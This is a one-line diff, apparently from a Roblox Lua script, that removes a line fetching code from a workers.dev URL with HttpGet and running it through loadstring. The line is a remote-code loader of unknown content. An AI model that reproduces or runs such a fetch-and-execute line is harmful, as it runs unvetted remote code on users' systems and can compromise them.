@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://leon4951-source.faqihhfiugfgf816.workers.dev/"))()
